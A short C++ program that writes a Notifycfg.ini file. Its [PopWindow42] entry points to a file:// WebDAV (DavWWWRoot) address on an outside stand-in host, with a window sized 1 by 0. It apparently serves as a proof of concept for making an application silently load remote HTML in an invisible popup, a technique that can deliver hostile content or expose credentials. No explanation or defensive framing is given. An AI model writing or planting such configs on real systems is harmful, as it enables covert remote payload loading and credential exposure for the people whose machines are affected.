#include <fstream>

int main() {
    const char *config = R"cfg(
[PopWindow42]
Address="file://new-host.example.org/DavWWWRoot/assets/new.htm"
Height=1
Width=0
)cfg";
    std::ofstream("Notifycfg.ini") << config;
}
